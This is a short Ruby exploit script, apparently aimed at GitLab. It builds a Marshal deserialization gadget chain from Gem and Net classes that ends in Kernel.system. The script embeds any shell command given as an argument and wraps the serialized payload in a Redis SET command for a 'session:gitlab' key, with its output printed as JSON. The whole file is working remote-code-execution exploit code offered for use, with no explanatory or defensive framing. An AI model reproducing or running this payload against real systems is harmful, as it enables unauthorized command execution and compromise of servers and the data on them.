require 'redis'
require 'json'
# NOTE: Made by vakzz I only made some minor changes


if ARGV.length < 1
  puts "[!] Please pass command argument"
  puts 'Example: ruby payload.rb "whoami > /tmp/test"'
  exit
end

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "#{ARGV[0]}")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', 'aaa')

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
a = "ggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:gggg\r\n$"+((payload.length).to_s)+"\r\n"+payload
puts a.to_json
